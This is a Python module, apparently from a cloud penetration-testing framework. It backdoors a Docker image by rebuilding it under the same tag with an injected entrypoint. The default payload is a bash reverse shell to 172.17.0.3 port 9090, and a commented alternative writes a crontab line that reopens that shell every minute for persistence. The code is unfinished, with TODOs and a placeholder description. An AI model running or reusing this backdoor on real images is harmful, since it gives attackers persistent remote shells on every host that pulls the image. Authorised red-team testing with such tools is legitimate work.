import docker
from io import BytesIO


#   TODO: Fix reverse shell
#   TODO: Let reverse shell works with different types OS images


module_info = {
    'name': 'docker__backdoor_reverse_shell',
    'author': 'Jack Ganbold of Rhino Security Labs',
    'category': 'PERSIST',
    'one_liner': 'Does this thing.',
    'description': 'Add reverse shell into the entrypoint of a docker image.',
    'services': ['Docker'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [],
}


def get_dockerfile_like_obj(target_image, script):
    dockerfile = '''
    FROM {}
    RUN echo 'Hello, from Rhino.' >backdoor3.txt
    {}
    '''.format(target_image, script)
    return BytesIO(dockerfile.encode('utf-8'))


def docker_build(docker_client, target_image, script):
    docker_fileobj=get_dockerfile_like_obj(target_image, script)
    return docker_client.images.build(fileobj=docker_fileobj, rm=True, tag=target_image)


def main(args):
    data  = {
        'count': 0,
        'payload': {}
    }

    target_image = args['repository_uri'] + ":" + args['tag'] 
    docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')

    try:
        docker_build_response = docker_build(docker_client, target_image, args['script'])
    except Exception as e:
        print(e)

    out = 'Built {} and attached a reverse shell backdoor'.format(docker_build_response)
    print(out)

    data['payload'].update({
        'repository_uri': args['repository_uri'],
        'tag': args['tag'],
        'script': args['script']
    })
    
    data['count'] = 1
    
    return data


def summary(data):
    out = ''
    out += '{} Image backdoored'.format(data['count'])
    return out


if __name__ == "__main__":
    print('Running module {}...'.format(module_info['name']))

    args = {
        'repository_uri': 'ubuntu',
        'tag': 'latest',
        'script': 'CMD ["bash -i >& /dev/tcp/172.17.0.3/9090 0>&1"]'
    }

    # 216825089941.dkr.ecr.us-east-1.amazonaws.com/pacu
    # 'script': 'CMD ["/bin/bash","-c","echo -e \"* * * * * root bash -i >& /dev/tcp/172.17.0.3/9090 0>&1\\n\" >> /etc/crontab"]'

    data = main(args) 

    if data is not None:
        summary = summary(data)
        if len(summary) > 1000:
            raise ValueError('The {} module\'s summary is too long ({} characters). Reduce it to 1000 characters or fewer.'.format(module_info['name'], len(summary)))
        if not isinstance(summary, str):
            raise TypeError(' The {} module\'s summary is {}-type instead of str. Make summary return a string.'.format(module_info['name'], type(summary)))
        
        print('{} completed.\n'.format(module_info['name']))
        print('MODULE SUMMARY:\n\n{}\n'.format(summary.strip('\n')))   
        